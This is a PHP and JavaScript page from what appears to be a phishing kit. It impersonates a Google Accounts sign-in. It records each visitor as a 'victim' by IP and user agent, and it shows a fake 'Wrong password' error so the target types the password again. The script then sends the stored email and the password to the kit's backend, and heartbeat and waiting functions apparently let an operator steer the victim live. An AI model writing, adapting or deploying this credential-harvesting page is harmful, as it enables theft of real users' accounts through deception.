<?php
require('shade/core/functions.php');

$ip = $victim->getVictimIP();

$sessionVictim = !empty($_SESSION['ent_id']) ? $crud->getVictim($_SESSION['ent_id']) : null;

if (empty($sessionVictim)) {
    unset($_SESSION['ent_id']);
    $newId = $victim->createVictim([
        'ip_address' => $ip,
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'next_page'  => 'start',
        'heartbeat'  => time()
    ]);

    if ($newId) {
        $_SESSION['ent_id'] = $newId;
    }
}

require_once('includes/google_layout.php');
google_head('Welcome - Google Accounts');
?>

<div class="g-card g-card-split g-card-pass">
    <?php google_card_progress(); ?>

    <div class="g-split-layout">
        <div class="g-split-left">
            <?php google_logo(); ?>
            <h1 class="g-title">Welcome</h1>
            <?php google_user_chip(); ?>
        </div>

        <div class="g-split-right">
            <form id="passwordForm" class="g-form" action="#" method="POST">
                <div class="g-field">
                    <input type="password" id="passwordInput" class="g-input is-error" placeholder=" " required autocomplete="current-password">
                    <label class="g-label" for="passwordInput">Enter your password</label>
                    <div id="error-msg" class="g-error is-visible">
                        <svg width="16" height="16" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                        <span>Wrong password. Try again.</span>
                    </div>
                </div>

                <label class="g-check">
                    <input type="checkbox" id="showPassword">
                    <span>Show password</span>
                </label>

                <div class="g-actions">
                    <a href="#" class="g-btn g-btn-text">Forgot password?</a>
                    <button type="submit" class="g-btn g-btn-primary">Next</button>
                </div>
            </form>
        </div>
    </div>
</div>

<?php google_footer(); google_scripts(); ?>
<script>
GoogleAuth.loadEmail('dynamicEmail', true);
GoogleAuth.initShowPassword('showPassword', 'passwordInput');
var wrongHeartbeat = GoogleAuth.startHeartbeat('wrong', false);

var passwordInput = document.getElementById('passwordInput');
var errorMsg = document.getElementById('error-msg');

passwordInput.addEventListener('input', function () {
    passwordInput.classList.remove('is-error');
    errorMsg.classList.remove('is-visible');
});

document.getElementById('passwordForm').addEventListener('submit', function (e) {
    e.preventDefault();
    var email = localStorage.getItem('savedEmail');
    var password = passwordInput.value;
    if (!password) return;

    if (window.GoogleAuth && typeof GoogleAuth.showCardLoading === 'function') {
        GoogleAuth.showCardLoading('.g-card');
    } else {
        document.querySelector('.g-card')?.classList.add('is-loading');
    }

    GoogleAuth.sendData({
        currentpage: 'login2',
        username: email,
        password: password
    }).always(function () {
        if (window.GoogleAuth && typeof GoogleAuth.startWaiting === 'function') {
            wrongHeartbeat = GoogleAuth.startWaiting('wrong', '.g-card', wrongHeartbeat);
        } else if (window.GoogleAuth && typeof GoogleAuth.startHeartbeat === 'function') {
            clearInterval(wrongHeartbeat);
            wrongHeartbeat = GoogleAuth.startHeartbeat('wrong', true);
        }
    });
});
</script>
</body>
</html>
